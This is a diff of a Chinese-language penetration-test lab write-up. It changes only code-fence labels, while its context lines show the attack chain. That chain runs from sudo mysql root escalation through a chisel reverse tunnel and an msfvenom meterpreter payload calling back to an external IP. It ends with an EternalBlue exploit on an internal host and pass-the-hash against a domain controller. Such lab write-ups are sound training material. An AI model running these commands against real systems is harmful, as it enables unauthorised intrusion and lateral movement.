@@ -53,7 +53,7 @@ start vulscan
 
 ![img](img/image_20250135-173503.png)
 
-```shell
+```bash
 (remote) www-data@ubuntu-web01:/var/www/html$ whoami
 www-data
 ```
@@ -78,7 +78,7 @@ User www-data may run the following commands on ubuntu-web01:
 
 参考 [mysql | GTFOBins](https://gtfobins.github.io/gtfobins/mysql/)
 
-```shell
+```bash
 (remote) www-data@ubuntu-web01:/tmp$ sudo mysql -e '\! /bin/sh'
 (remote) root@ubuntu-web01:/tmp$ whoami
 root
@@ -86,7 +86,7 @@ root
 
 成功拿下入口点的最高权限
 
-```shell
+```bash
 (remote) root@ubuntu-web01:/root# cat /root/flag/flag01.txt
  ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████
 ░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██
@@ -104,7 +104,7 @@ flag01: flag{60b53231-
 
 ## 内网探测
 
-```shell
+```bash
 (remote) root@ubuntu-web01:/tmp# ifconfig
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255
@@ -177,7 +177,7 @@ start vulscan
 
 建立内网代理
 
-```shell
+```bash
 # vps
 root@jmt-projekt:~# ./tools/chisel_1.10.1/chisel_1.10.1_linux_amd64 server -p 9111 --reverse
 2025/01/31 17:55:50 server: Reverse tunnelling enabled
@@ -195,7 +195,7 @@ root@jmt-projekt:~# ./tools/chisel_1.10.1/chisel_1.10.1_linux_amd64 server -p 91
 
 启动 msfconsole 之后，先将入口点上线 msf
 
-```shell
+```bash
 root@jmt-projekt:~/tools# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=8.129.29.180 LPORT=9999 -f elf > 8.129.29.180.9999.elf
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -229,7 +229,7 @@ Meterpreter  : x64/linux
 
 然后建立路由
 
-```shell
+```bash
 meterpreter > run post/multi/manage/autoroute
 [*] Running module against 172.22.1.15
 [*] Searching for subnets to autoroute.
@@ -238,7 +238,7 @@ meterpreter > run post/multi/manage/autoroute
 
 对 `172.22.1.21 XIAORANG-WIN7` 这台靶机发起永恒之蓝攻击
 
-```shell
+```bash
 msf6 > use exploit/windows/smb/ms17_010_eternalblue
 [*] Using configured payload windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp
@@ -288,7 +288,7 @@ SMB         172.22.1.2      445    DC01             Unbelievable! ! You found th
 
 或者
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains impacket-smbexec -hashes :10cf89a850fb1cdbe6bb432b859164c8 Administrator@172.22.1.2 -codec gbk
 [proxychains] config file found: /etc/proxychains4.conf
